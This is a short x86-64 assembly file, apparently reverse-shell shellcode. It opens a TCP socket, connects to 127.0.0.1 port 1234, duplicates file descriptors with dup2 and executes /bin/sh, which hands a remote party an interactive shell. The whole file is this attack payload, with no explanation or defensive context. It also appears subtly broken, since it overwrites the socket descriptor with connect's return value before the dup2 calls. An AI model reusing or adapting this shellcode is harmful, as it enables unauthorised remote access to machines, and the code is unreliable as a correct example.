.code64
.file "tcp_reverse.s"

.section .text
.global _start

_start:
    xor %rax,%rax
    add $41,%rax
    xor %rdi,%rdi
    add $2,%rdi
    xor %rsi, %rsi
    inc %rsi
    syscall
    mov %rax,%rdi
socket_connect:
    push $0x0100007f
    pushw $0xd204
    pushw $0x2
    mov %rsp,%rsi
    mov $16,%rdx
    mov $42,%rax 
    syscall
connect_resolve:
    mov %rax,%rdi 
    xor %rsi,%rsi
    mov $33,%rax
    syscall
    xor %rsi,%rsi
    add $1,%rsi
    mov $33,%rax
    syscall
    xor %rsi,%rsi
    add $2,%rsi
    mov $33,%rax
    syscall
shell:
    xor %rax,%rax
    push %rax
    mov %rsp,%rdx
    mov $0x68732f6e69622f, %rbx
    push %rbx
    mov %rsp,%rdi
    push %rax
    push %rdi
    mov %rsp, %rsi
    add $59,%rax
    syscall
